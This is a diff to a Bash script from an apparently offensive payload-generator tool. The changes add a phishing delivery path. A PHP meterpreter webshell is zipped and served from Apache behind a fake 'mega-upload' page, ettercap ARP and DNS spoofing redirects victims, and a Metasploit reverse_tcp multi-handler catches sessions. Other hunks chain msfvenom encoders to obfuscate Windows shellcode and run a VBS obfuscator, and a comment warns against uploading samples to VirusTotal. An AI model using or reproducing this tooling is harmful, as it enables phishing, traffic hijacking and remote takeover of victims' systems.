@@ -1283,9 +1283,9 @@ cat << !
 
 !
 
-# TODO: rever retirar as interacçoes
 # use metasploit to build shellcode (msf encoded)
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 8 -f c > $IPATH/output/chars.raw"
+
 
 echo ""
 # display generated code
@@ -3146,7 +3146,7 @@ cat $IPATH/obfuscate/$N4m.vbs | grep '"' | awk {'print $3'} | cut -d '=' -f1
 echo "[☠] Obfuscating sourcecode..."
 sleep 2
 cd $IPATH/obfuscate/
-xterm -T "☠ VBS-OBFUSCATOR.PY ☠" -geometry 110x23 -e "python vbs-obfuscator.py $N4m.vbs final.vbs"
+xterm -T " VBS-OBFUSCATOR.PY " -geometry 110x23 -e "python vbs-obfuscator.py $N4m.vbs final.vbs"
 cp final.vbs $IPATH/output/$N4m.vbs > /dev/null 2>&1
 rm $N4m.vbs > /dev/null 2>&1
 echo "[☠] Injecting shellcode -> $N4m.vbs!"
@@ -3278,9 +3278,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
 echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
-rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
+rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 cd $IPATH/
@@ -4067,18 +4067,11 @@ sleep 2
 echo "[☠] deleting webshell.php junk..."
 sleep 2
 cd $IPATH/output
-#
-# no more need to clean output ?
-# new php/meterpreter is diferent output
-#
-#sed "s/\///" $N4m.php > web2.php
-#sed "s|*||" web2.php > $N4m.php
-#rm $IPATH/output/web2.php > /dev/null 2>&1
 
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" --width 370 --height 300) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1
 
 
    if [ "$serv" = "multi-handler (default)" ]; then
@@ -4107,17 +4100,84 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
    else
 
-     echo "[x] Abort ...."
-     sleep 2
 
+     # edit files nedded
+     cd $IPATH/templates/phishing
+     cp $InJEc12 mega[bak].html
+     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
+     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+     # copy from output
+     cd $IPATH/output
+     echo "[☠] creating archive -> $N4m.zip"
+     zip $N4m.zip $N4m.php > /dev/null 2>&1
+     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
+
+
+if [ "$D0M4IN" = "YES" ]; then
+        echo "---"
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
+
+        else
+
+
+        echo "---"
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+          fi
+        fi
    fi
 
 
 # CLEANING EVERYTHING UP
 echo "[☠] Cleanning temp generated files..."
 sleep 2
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.php > /dev/null 2>&1
+rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 clear
 cd $IPATH/
 
@@ -4191,7 +4251,7 @@ chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" --width 370 --height 300) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1
 
 
    if [ "$serv" = "multi-handler (default)" ]; then
@@ -4220,17 +4280,83 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
    else
 
-     echo "[x] Abort ...."
-     sleep 2
+     # edit files nedded
+     cd $IPATH/templates/phishing
+     cp $InJEc12 mega[bak].html
+     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
+     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+     # copy from output
+     cd $IPATH/output
+     echo "[☠] creating archive -> $N4m.zip"
+     zip $N4m.zip $N4m.php > /dev/null 2>&1
+     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
 
+
+if [ "$D0M4IN" = "YES" ]; then
+        echo "---"
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
+
+        else
+
+
+        echo "---"
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+          fi
+        fi
    fi
 
 
 # CLEANING EVERYTHING UP
 echo "[☠] Cleanning temp generated files..."
 sleep 2
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
+rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $ApAcHe/$N4m.php > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 clear
